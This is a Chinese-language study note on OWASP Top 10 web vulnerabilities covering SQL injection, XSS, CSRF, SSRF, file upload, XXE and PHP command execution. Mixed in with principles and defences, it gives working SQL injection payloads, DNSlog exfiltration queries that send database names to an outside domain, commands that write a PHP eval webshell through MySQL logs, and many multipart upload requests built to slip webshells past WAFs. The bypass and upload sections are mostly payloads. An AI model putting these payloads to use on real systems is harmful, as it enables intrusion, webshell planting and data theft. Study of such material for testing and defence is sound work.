# hvv_OWASP_TOP10


# TOP10漏洞

```
1、SQL注入 
2、失效的身份认证和会话管理
3、跨站脚本攻击XSS
4、直接引用不安全的对象
5、安全配置错误
6、敏感信息泄露
7、缺少功能级的访问控制
8、跨站请求伪造CSRF
9、使用含有已知漏洞的组件
10、未验证的重定向和转发
```

# 常见web漏洞

### 01-SQL注入漏洞

#### 1.原理

SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的SQL语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。

#### 2.分类

##### (1)注入点的不同分类

●数字类型的注入
●字符串类型的注入

##### (2)提交方式的不同分类

●GET注入
●POST注入
●COOKIE注入
●HTTP注入

##### (3)获取信息的方式不同分类

●基于布尔的盲注
如果数据库中可以查到相应的数据，页面会正常显示，反之异常。

●基于时间的盲注
无论输入任何数据，页面的效果完全一样，根据页面是否延迟判断出数据库中查询出的结果。

●基于报错的注入

●二次注入

●宽字节注入

有些waf会在我们的提交数据前会被加入\，\的编码为%5c,我们在后面加上%df后变为了%df%5c,变成一个繁体汉字運，变成了一个有多个字节的字符。因为用了gbk编码，使这个为一个两字节，绕过了单引号闭合,逃逸了转义

●盲注和延时注入的共同点？
都是一个字符一个字符的判断

#### 3.盲注原理

将数据库中查询的数据结果进行截断为单个字符，然后同构造逻辑语句。通过判断页面显示是 否异常或页面是否演示来判断数据库中查询的结果 

#### 4.一个登录框怎么测试

1. 验证用户名和密码的输入限制：在输入用户名和密码时，需要验证输入的长度、字符类型等是否符合要求。可以尝试输入过长或过短的字符串、特殊字符等来测试应用程序的输入限制。
2. 测试身份认证功能：尝试使用正确的用户名和密码进行登录，并确认登录成功后能够访问受保护的资源。然后尝试使用无效的凭据进行登录，确保会收到相应的错误提示信息。
3. 测试防止暴力破解的措施：如果应用程序有防止暴力破解的措施，例如锁定账户或添加验证码等，需要测试这些措施是否有效。
4. 测试跨站点脚本（XSS）漏洞：在输入框中注入 JavaScript 代码，尝试看是否能执行该代码，如果能执行，则意味着应用程序存在 XSS 漏洞。
5. 测试 SQL 注入漏洞：在输入框中注入 SQL 代码，尝试看是否能影响后台数据库，如果能影响，则意味着应用程序存在 SQL 注入漏洞。
6. 测试弱口令：尝试使用一些常见的弱口令进行登录，例如“123456”、“password”、“admin”等，以检测应用程序是否容易受到攻击。
7. 测试会话管理：测试应用程序在登录后是否正确维护会话，例如在登录后关闭浏览器并重新打开应用程序，是否需要重新进行登录等。

#### 5.报错注入的函数有哪些？

```
extractvalue(1, concat(0x5c,(select user())))
updatexml(0x3a,concat(1,(select user())),1)
exp((SELECT * from(select user())a))``ST_LatFromGeoHash((select * from(select * from(select user())a)b))
GTID_SUBSET(version(), 1)
```

**SUBSTRING() 函数：**该函数用于从字符串中获取子串。通过构造包含错误的语句，攻击者可以利用该函数来确定字符串值的长度和内容，例如：

```
SELECT SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1),1,1);
```

**LENGTH() 函数：**该函数返回字符串的长度。攻击者可以使用该函数来确定查询结果的长度，并进一步推断数据的内容，例如：

```
SELECT LENGTH((SELECT username from users WHERE id=1));
```

**ASCII() 函数：**该函数返回字符的 ASCII 值。攻击者可以结合其他函数，例如 SUBSTRING() 和 LENGTH()，来识别字符串值的每个字符，例如：

```
SELECT ASCII(SUBSTRING((SELECT password from users WHERE username='admin'),1,1));
```



#### 6.Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何构造？

（1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。
（2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。
（3）Mysql 中利用 load_file() 构造payload ' and if((select load_file(concat('\\',(select database()),'.xxx.ceye.io\abc'))),1,0)#
（4）Mssql 下利用 master..xp_dirtree 构造payload

```
DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+'.xxx.ceye.io';EXEC('master..xp_dirtree"'+@host+'\foobar$"');
```

#### 7.SQL注入时 and or 被过滤怎办？

1.大小写变形
2.编码 
3.添加注释 
4.双写法 
5.利用符号形式 
6.浮点数 #数字被注释 
7.函数替代 #符号被注释

#### 8.SQL注入过滤逗号如何处理

在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决:

```csharp
select substr(database() from 1 for 1);
select mid(database() from 1 for 1);
```

使用join：

```csharp
union select 1,2     #等价于
union select * from (select 1)a join (select 2)b
```

使用like：

```csharp
select ascii(mid(user(),1,1))=80   #等价于
select user() like 'r%'
```

对于limit可以使用offset来绕过：

```csharp
select * from news limit 0,1
# 等价于下面这条SQL语句
select * from news limit 1 offset 0
```



```csharp
select * from table1 where id =1 and exists (select * from table2 where ord(substring(username from 1 for 1)=97);

127' UNION SELECT * FROM ((SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (SELECT 5)e)#

select case when substring((select password from mysql.user where user='root') from 1 for 1)='e' then sleep(5) else 0 end #

substring((select password from mysql.user where user='root') from -1）='e'

原文：https://blog.csdn.net/nzjdsds/article/details/81322529 
```

https://www.jianshu.com/p/d10785d22db2


#### 9.sql 注入绕过 WAF的 方法？

**白盒**

根据waf的固定规则去寻找有没有漏网之鱼.

**黑盒**

**架构层绕waf**

1. 用户本身是进入waf后访问web页面的,只要我们找到web的真实ip,就可以绕过waf
2. 在同网段内,页面与页面之间,服务器与服务器之间,通过waf的防护,然后展示给我们,只要我们在内部服务之间进行访问,即可绕过waf
3. 边界漏洞,同样类似于同网段数据,我们可以利用已知服务器存在的ssrf漏洞,将数据直接发送给同网段的web2进行sql注入.

**协议层面绕过waf**

1. 基于协议层,有的waf只过滤get请求,而对post请求没有做别的限制,因此,可以将get类型转换成post请求

2. 文件格式,页面只对Content-Type为application/x-www-form-urlencoded数据格式进行过滤,因此我们可以将Content-Tyoe格式修改为multipart/form-data,即可绕过

3. 参数污染 有的waf仅对部分内容进行过滤如

**规则层面绕过**

1.关键字可以用%（只限 IIS 系列）。比如 select，可以 sel%e%ct
2.注释绕过，如 `/*!select*/`，`/**/`，`/*!*/`，`/*!12345*/`，`#`
3.编码绕过如十六进制编码、URL编码、Unicode编码（服务器端未检测或检测不严具有编码形式的关键字）
4.multipart 请求绕过，在 POST 请求中添加一个上传文件，绕过了绝大多数 WAF
5.参数绕过，复制参数，id=1&id=1
6.组合法 如 and 可以用&&再 URL 编码
7.替换法，如 and 改成&&;=可以用 like 或 in 等
8.函数大小写混写绕过（服务器端检测是未开启大小写不敏感）
9.多重关键字绕过如ununionion selselectect（检测到敏感字符时替换为空）
10.等价函数或命令绕过

```
等价函数形式：Mysql查询：Union distinct、updatexml、Extractvalue、floor
字符串截取函数：mid、substr、substring、left、reverse
字符串连接函数：concat、group_concat、concat_ws
字符串转换：char、hex、unhex
替换逗号：limit 1 offset 0，mid(version() from 1 for 1)
替换等号：like
```

11.特殊符号绕过绕过

```
限制形式：科学记数法 and 1e0 = 1e0
空白字符 %0a %a0 %0b %20 %09
反单引号 `table_name`
括号 select * from (test.admin)
```

#### 10.sql注入的告警的流量特征看哪些方面？

如：and 1=1、order by、单引号/双引号、union select、information_schema
		column_name   字段名
		table_name  字段所属表名
		table_schema   字段所属表所属库的名字

#### 11.sql写入shell的两个函数

**into outfile 和 into dunmpfile**
**into outfile** 主要的目的是导出 文本文件，我们在渗透过程中是用来写 shell 的
**into dumpfile** 的主要目的是导出二进制文件，在后面我们讲到 UDF 提权的过程中会经常用到这个函数生成我们的 udf.dll

#### 12.sqlmap的--os-shell原理

通过into outfile往服务器写入两个php文件（其中的tmpugvzq.php可以让我们上传文件到网站路径下、tmpbylqf.php文件用于命令执行并将输出的内容返回sqlmap端）

#### 13.sql写入shell的条件

1.知道网站的绝对路径

2.网站路径有写入权限

3.当前数据库权限为dba（最高权限）

4.`secure_file_priv`参数为空

可以通过一下函数来查询secure_file_priv参数：

```
show global variables like "%secure_file_priv%"
```



> 导入导出的权限在mysql数据库中是由secure_file_priv参数来控制的，当这个参数后面为null时，表示不允许导入导出，如果为具体文件夹时，表示仅允许在这个文件夹下导入导出，如果后面没有值（为空）时，表示可以在任何文件夹下导入导出。5.7版本后默认为null



#### 14.找绝对路径的方法

1.网页报错信息
2.Phpinfo，探针
3.使用字典对目标站点的绝对路径暴力破解
4.对目标网站进行js代码审计,查看是否存在信息泄露出站点的绝对路径

#### 15.sqlmap中risk和levels区别

-r 参数表示风险等级，-level 参数表示扫描等级

**风险等级（-r 或 --risk）：**表示发现漏洞的可能性，取值范围是 1-3，越高表示发现漏洞的可能性越大。在较低的风险等级下，sqlmap只执行少量测试，而在更高的风险等级下，sqlmap会进行更多的测试。

**扫描等级（-level 或 --level）：**表示扫描深度和测试量，取值范围是 1-5，越高表示扫描深度越深、测试量越大。在较低的扫描等级下，sqlmap只执行一些基本的测试，而在更高的扫描等级下，sqlmap会执行更多的测试，并探测更多的漏洞类型。

#### 16.数据库全局日志写入

条件：

1. 数据库root权限
2. 获取网站的绝对路径

查看是否开启了全局日志以及全局日志的存放位置

```
SHOW VARIABLES LIKE '%general%' 
```

修改或者设置全局日志的保存目录为网站的web目录,并且日志保存为php文件

```
set global general_log=on;
set global general_log_file="C:\\phpStudy\\WWW\\test.php";
```

设置开启日志以及日志存储位置,这里日志存储位置为站点的根目录,执行命令写入日志文件

```
SELECT "<?php @eval($_POST['cmd']); ?>"
```

#### 17.数据库慢查询日志写入

慢日志查询 记录所有执行时间超过字段long_query_time规定时间的所有查询或者不使用索引的查询,默认情况下慢查询日志为关闭,long_query_time值为10秒

条件

1. 数据库root权限
2. 获取网站的绝对路径

查询相关配置

```
show variables like '%slow%' 
```

打开

```
set global slow_query_log=on;
```

写入

```
select '<?php @eval($_POST[shell]);?>' or sleep(10); 
```

#### 18.Mysql 在渗透测试中的利用

[Mysql 在渗透测试中的利用 | K0rz3n's Blog](https://www.k0rz3n.com/2018/10/21/Mysql 在渗透测试中的利用/#三、MYSQL-UDF-提权)

## 02-xss漏洞

#### 1.原理

XSS全称为Cross Site Scripting，为了和CSS分开简写为XSS，中文名为跨站脚本。该漏洞发生在用户端，是指在渲染过程中发生了非预期的JavaScript代码执行。XSS通常被用于获取Cookie、以受攻击者的身份进行操作等行为。

#### 2.分类：

反射型XSS
储存型XSS
DOM XSS

#### 3.危害

​	1.用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。
​	2.攻击者能够在一定限度内记录用户的键盘输入。
​	3.攻击者通过CSRF等方式以用户身份执行危险操作。
​	4.XSS蠕虫。
​	5.获取用户浏览器信息。
​	6.利用XSS漏洞扫描用户内网。

#### 4.防御：

**总体思路:**对用户输入进行过滤,对输出进行编码

1.对用户输入进行XSS防御方式有2种:基于黑名单的过滤和基于白名单的过滤. 而白名单相对来说更安全;

```
黑名单:只规定哪些数据不能被输入,很可能被绕过;比如对 ' " <> 等进行过滤
白名单:只定义哪些数据正常才能被提交;
```

2.设置http-only参数为true,这样JS就不能读取cookie信息了;(特殊常见可能被绕过)
3.使用一些函数进行防御
4.不要随意打开一些来历不明的网站或链接

#### 5.如何快速判定XSS类型？

存储型XSS：
发送一次带XSS代码的请求，以后这个页面的返回包里都会有XSS代码；

反射型XSS：
发送一次带XSS代码的请求，只能在当前返回的数据包中发现XSS代码；

DOM型XSS：
发送一次带XSS代码的请求，在返回包里没有XSS代码；

#### 6.存储型XSS怎么利用

XSS攻击的原理是通过修改或者添加页面上的JavaScript恶意脚本，在浏览器渲染页面的时 候执行该脚本，从而实现窃取COOKIE或者调用Ajax实现其他类型的CSRF攻击，还可以插入 beef进行钓鱼等 

#### 7.CORS（浏览器同源策略）

 js =>ajax 去请求其他网站的东西 test.com 根据浏览器的CORS策略 他只能在test.com里面请求东西 test.com 调用ajax 去访问 xxxx.com assdasd.test.com 如果目标的CORS头 默 认不放行test.com 这样 test.com 的ajax请求就不会访问其他网站 

#### 8.XSS绕过waf总结

1. Script 标签
2. JavaScript 事件
3. 行内样式(Inlinestyle)
4. CSS import
5. Javascript URL
6. 利用字符编码
7. 绕过长度限制
8. 超文本内容
9. 变形主要包含大小写和JavaScript变形

## 03-csrf漏洞

#### 1.原理：

​	当黑客发现某网站存在CSRF漏洞，并且构造攻击参数将payload制作成网页，用户访问存在CSRF漏洞的网站，并且登录到后台，获取cookie，此时黑客发送带有payload的网址给用户，用户同时打开黑客所发来的网址，执行了payload，则造成了一次CSRF攻击

#### 2.形成原因：

​	主要是漏洞网站没有经过二次验证，和用户在浏览漏洞网站的时候，同时点击了hack制造的payload

#### 3.如何防止 CSRF?

1.验证 referer
2.验证 token

#### 4.csrf成功利用的条件

1- 用户在统一浏览器下
2- 没有关闭浏览器的情况下
3- 访问了攻击者精心伪装好的恶意链接

#### 5.XSS和CSRF的区别

1. xss是单一网站不需要登录就能获取cookie,csrf是有一个漏洞网站,和一个攻击网站需要先登录漏洞网站
2. xss是向网站注入js代码,执行js代码.csrf利用网站本身漏洞去执行网站功能

3. CSRF比XSS漏洞危害更高。

4. CSRF可以做到的事情，XSS都可以做到。

5. XSS有局限性，而CSRF没有局限性。

6. XSS针对客户端，而CSRF针对服务端。

7. XSS是利用合法用户获取其信息，而CSRF是伪造成合法用户发起请求。

## 04-ssrf漏洞

#### 1.原理

SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF 攻击的目标是从外网无法访问的内部系统

1）服务器允许向其他服务器获取资源
2）但是并没有对该地址做严格的过滤和限制
3）所以导致了攻击者可以向受害者服务器，传入任意的URL 地址，并将数据返回

#### 2.防御：

1.限制请求的端口为 HTTP 常用的端口，比如 80,443,8080,8088 等
2.黑名单内网 IP。
3.禁用不需要的协议，仅仅允许 HTTP 和 HTTPS

#### 3.SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？

(1)利用进制转换
(2)利用DNS解析
(3)利用句号`（127。0。0。1）`
(4)利用`[::]（http://[::]:80/）`
(5)利用`@（http://example.com@127.0.0.1）`
(6)利用短地址`（http://dwz.cn/11SMa）`
(7)协议`（Dict://、SFTP://、TFTP://、LDAP://、Gopher://）`

#### 4.漏洞存在的地方：

1.能够对外发起网络请求的地方
2.请求远程服务器资源的地方
3.数据库内置功能
4.邮件系统
5.文件处理
6.在线处理工具

https://xz.aliyun.com/t/11215

https://zhuanlan.zhihu.com/p/346220565

https://www.buaq.net/go-66428.html

## 05-文件上传漏洞：

#### 1.文件上传原理

1. 用户在 Web 页面上选择要上传的文件，并提交表单。
2. 浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。
3. Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。
4. 服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。
5. 如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。
6. 服务器返回上传结果给客户端，告知用户文件是否上传成功。

#### 2.漏洞原理：

由于程序员在对用户文件上传功能实现代码没有严格限制用户上传文件后缀以及文件类型或者处理缺陷，而导致用户可以越过本身权限向服务器上传木马去控制服务器.

#### 3.攻击特征

文件类型绕过、文件名欺骗、恶意文件内容、大小限制绕过、插入../等字符遍历目录

#### 4.需满足条件

首先上传文件能够被web容器解释执行,所以文件上传后所在的目录要是web容器所覆盖到的路径,其次,用户能够从web访问这个文件,如果文件上传了,但是用户无法通过web 访问,或者无法得到web容器解释这个脚本,那么也不能称为漏洞,最后,文件上传的文件若被安全检查,格式化,图片压缩等功能改变了内容,则也可能攻击不成功

#### 5.数据包中可修改的地方

- Content-Disposition 一般可以更改 name 表单参数值.
- 不能更改filename :文件名
- 可以更改Content-Type:文件MIME
- 视情况更改boundary:内容划分,可以更改

#### 6.waf如何拦截恶意文件

- 文件名:解析文件名,判断是否在黑名单内
- 文件内容:解析文件内容,判断是否为webshell
- 文件目录权限:这个由主机waf实现

1. 获取Request Header中Content-Type的boundary值
2. 根据boundary值,解析post数据,获取文件名
3. 判断文件名是否在拦截黑名单/白名单之外

#### 7.绕过

##### 黑名单绕过

a.通过一些特殊后缀 .php5 、.phtml、.asa、.jap等
b.上传.htacess
c.pHp大小写变换
d.在数据包中 后文件缀名前加空格
e.后缀名前加.
f.加上::$DATA
g.未循环验证，可以使用x.php…类似的方法

##### 白名单绕过

（一般需要配合其他漏洞一起利用）
a.%00截断
在url中%00表示ascll码中的0 ，而ascii中0作为特殊字符保留，表示字符串结束，所以当url中出现%00时就会认为读取已结束。
%00适用于php>5.3.42,且服务器中的php.ini中的magic_quotes_gpc = Off，才可以进行%00截断
（magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有:post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误）

##### 字符变异

###### 引号变换

头部字段的值既可以添加单引号也可以添加双引号,还可以不添加引号,都不会影响上传的结果,还可以去除filename字符串中的引号.

```
Content-Disposition: "form-data"; name=file_x; filename="xx.php"
Content-Disposition: form-data; name="file_x"; filename="xx.php
Content-Disposition: form-data; name="file_x"; filename='xx.php
Content-Disposition: form-data; name="file_x"; filename="xx.php;
```

###### 大小写变换

对关键字符进行大小写转换 Content-Disposition  name  filename.比如将name转换成NaMe,Content-Disposition转换成content-disposition

###### 添加换行符

字符值与等号之间可以加入换行符,依然可以正常上传,如使用

```
Content-Disposition: "form-data"; name="file_x"; filename=[0x09]"xx.php"
Content-Disposition: "form-data"; name="file_x"; filename=[0x09]"xx.php
Content-Disposition: "form-data"; name="file_x"; filename=[0x09]"xx.php"[0x09]
Content-Disposition: "form-data"; name="file_x"; filename=[0x09]xx.php[0x09];
```

###### 多个分号

文件解析时,可能因为分号解析不到文件名,导致绕过

```
Content-Disposition: form-data; name="file_x";;; filename="test.php"
```

###### 多个等号

在post中的内容中使用多个等号对文件上传没有影响

```
Content-Disposition: form-data; name=="file_x"; filename===="test.php"
```

##### 变换Content-Disposition的值

在某些waf解析的时候,认为Content-Dispostion的值一定是form-data,造成绕过,其实Content-Dispostion可以任意变换或为空

```
Content-Disposition: fOrM-DaTA; name="file_x"; filename="xx.php"
Content-Disposition: form-da+ta; name="file_x"; filename="xx.php"
Content-Disposition: fo    r m-dat a; name="file_x"; filename="xx.php"
Content-Disposition: form-dataxx; name="file_x"; filename="xx.php"
Content-Disposition: name="file_x"; filename="xx.php"
```

###### 畸形的boundary头部

boundary可以变换为如下形式,且不影响上传

**multipart/form-data大小写变换**

```
Content-Type: mUltiPart/ForM-dATa; boundary=----WebKitFormBoundarye111
```

**multipart/form-data与boundary之间可以使用空格分割,且中间可以插入任何值**

```
Content-Type: multipart/form-data boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data x boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data abcdefg boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data a\|/?!@#$%^() boundary=----WebKitFormBoundarye111
```

**multipart/form-data与boundary之间可以使用逗号分割,且中间可以插入任何值**

```
Content-Type: multipart/form-data,boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data,x,boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data,abcdefg,boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data,a\|/?!@#$%^(),boundary=----WebKitFormBoundarye111
```

**boundary之前可以直接加入任何值(php可行)**

```
Content-Type: multipart/form-data;bypass&123**{|}boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data bypass&123**{|}boundary=----WebKitFormBoundarye111
Content-Type: multipart/form-data,bypass&123**{|}boundary=----WebKitFormBoundarye111
```

**boundary末尾可以使用逗号或者分号隔开插入任何值**

```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111;123abc
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye111,123abc
```

###### 顺序颠倒

交换name和filename的顺序

因为规定了Content-Disposition必须在最前面,所以只能交换name和filename的顺序.有的waf可能会匹配name在前面,filename在后面,可以导致绕过

```
Content-Disposition: form-data; filename="xx.php"; name="file_x"
```

交换Content-Disposition和Content-Type的顺序

Content-Disposition和Content-Type也是能够交换顺序的

```
Content-Type: image/png
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
```

交换不同boundary内容的顺序

不同boundary内容也能够交换,且不影响文件上传

```
------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
```

###### 内容重复

**boundary内容重复**

最后上传的文件是shell.php而非shell.jpg,但是如果取的文件名时只取了第一个就会被Bypass

```
------WebKitFormBoundarymeEzpUTMsmOfjwAA
Content-Disposition: form-data; name="upload_file"; filename="shell.jpg"
Content-Type: image/png

<?php @eval($_POST['hack']); ?>
------WebKitFormBoundarymeEzpUTMsmOfjwAA
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['hack']); ?>
------WebKitFormBoundarymeEzpUTMsmOfjwAA
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarymeEzpUTMsmOfjwAA--
```

下面这样也是可以正常上传的

```
------WebKitFormBoundarymeEzpUTMsmOfjwAA
------WebKitFormBoundarymeEzpUTMsmOfjwAA--
------WebKitFormBoundarymeEzpUTMsmOfjwAA;123
------WebKitFormBoundarymeEzpUTMsmOfjwAA
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['hack']); ?>
------WebKitFormBoundarymeEzpUTMsmOfjwAA
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundarymeEzpUTMsmOfjwAA--
```

**filename重复**

最终上传成功的文件名是shell.php。但是由于解析文件名时,会解析到第一个。正则默认都会匹配到第一个

```
Content-Disposition: form-data; name="upload_file"; filename="shell.jpg filename="shell.jpg"; filename="shell.jpg"; filename="shell.jpg"; filename="shell.jpg"; filename="shell.jpg"; filename="shell.php";
```

###### **数据溢出**

**name与filename之间插入垃圾数据**

```
POST /Pass-02/index.php HTTP/1.1
Host: hackrock.com:813
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf
Connection: close

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="upload_file"; fbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf; 
filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
```

**boundary字符串中加入垃圾数据**

boundray字符串的值可以为任何数据（有一定的长度限制）,当长度达到WAF无法处理时,而Web服务器又能够处理,那么就可以绕过WAF上传文件

**boundray末尾插入垃圾数据**

刚才讲到过boundary末尾可以插入任何数据,那么就可以在boundary字符串末尾加入大量垃圾数据

```
POST /Pass-01/index.php HTTP/1.1
Host: hackrock.com:813
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf,bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9
Connection: close
Content-Length: 592

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
```

**multipart/form-data与boundary之间插入垃圾数据**

刚才讲到过multipart/form-data与boundary之间可以插入任何数据,那么就可以在multipart/form-data与boundary之间加入大量垃圾数据

```
POST /Pass-01/index.php HTTP/1.1
Host: hackrock.com:813
Content-Type: multipart/form-data bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8659f2312bf8658dafbf0fd31ead48dcc0b9f2312bfWebKitFormBoundaryzEHC1GyG8wYOH1rffbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b8dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9f2312bf8658dafbf0fd31ead48dcc0b9boundary=----WebKitFormBoundaryzEHC1GyG8wYOH1rf
Connection: close
Content-Length: 319

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="upload_file"; filename="shell.php"
Content-Type: image/png

<?php @eval($_POST['x']);?>

------WebKitFormBoundaryzEHC1GyG8wYOH1rf
Content-Disposition: form-data; name="submit"

上传
------WebKitFormBoundaryzEHC1GyG8wYOH1rf--
```

###### 数据截断

**回车换行截断**

POST请求头的值（不是请求头）是可以换行的,但是中间不得有空行。若WAF匹配文件名到换行截止,则可以绕过

```
Content-Disposition: for
m-data; name="upload_
file"; fi
le
name="sh
ell.p
h
p"
```

**分号截断**

若WAF匹配文件名到分号截止,则可以绕过

```
Content-Disposition: form-data; name="upload_file"; filename="shell.jpg;.php"
```

**引号截断**

php<5.3 单双引号截断特性

```
Content-Disposition: form-data; name="upload_file"; filename="shell.jpg'.php"
Content-Disposition: form-data; name="upload_file"; filename="shell.jpg".php"
```

**00截断**

在url中%00表示ascll码中的0 ,而ascii中0作为特殊字符保留,所以当url中出现%00时就会认为读取已结束。这里使用[0x00]代替16进制的00字符

```
Content-Disposition: form-data; name="upload_file"; filename="shell.php[0x00].jpg"
```

#### 8.利用session.upload_progress

##### 条件

需要知道session文件的存放位置

如果`session.auto_start=On(默认关闭)`则PHP在接收请求的时候会自动初始化Session,不再需要执行session_start()

php>5.4

##### 使用方法

可以利用`session.upload_progress`将恶意语句写入session文件,然后包含session文件

session有一个默认选项`session.use_strict_mode`默认值为`0`此时用户是可以自己定义Session ID的,

比如,我们在Cookie里设置`PHPSESSID=TGAO`,PHP将会在服务器上创建一个文件:`/tmp/sess_TGAO`即使此时用户没有初始化Session,PHP也会自动初始化Session 并产生一个键值,这个键值由`ini.get("session.upload_progress.prefix")+由我们构造的session.upload_progress.name值`组成,最后被写入session文件里

默认配置`session.upload_progress.cleanup = on`导致文件上传后,session文件内容立即清空,此时我们可以利用竞争,在session文件内容清空前进行包含利用

```
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
```

`name`当它出现在表单中，php将会报告上传进度，最大的好处是，它的值可控；

`prefix+name`将表示为session中的键名

```php
一般的存放地址
/var/lib/php/sess_PHPSESSID
/var/lib/php/sessions/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSID
/var/lib/php5/sess_PHPSESSID
/var/lib/php7/sess_PHPSESSID
/var/lib/php/sess_PHPSESSID
/tmp/sess_PHPSESSID
/tmp/sessions/sess_PHPSESSED
```





## 06-XXE

**XXE xml外部实体注入**

#### 1.原理

XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载， 导致可加载恶意外部文件， 造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。 xxe漏洞触发的点往往是可以上传xml文件的位置， 没有对上传的xml文件进行过滤，导致可上传恶意xml文件。

#### 2.防御

1、使用开发语言提供的禁用外部实体的方法。
2、PHP：libxml_disable_entity_loader(true);
3、过滤用户提交的XML数据
4、XML 解析库在调用时严格禁止对外部实体的解析

#### 3.关键词：

<!DOCTYPE和<!ENTITY，或者，SYSTEM和PUBLIC

## 07-php命令执行

#### 相关函数

```
eval()

assert

preg_replace()

create_function()

array_map()

call_user_func()

call_user_func_array()

array_filter()
```


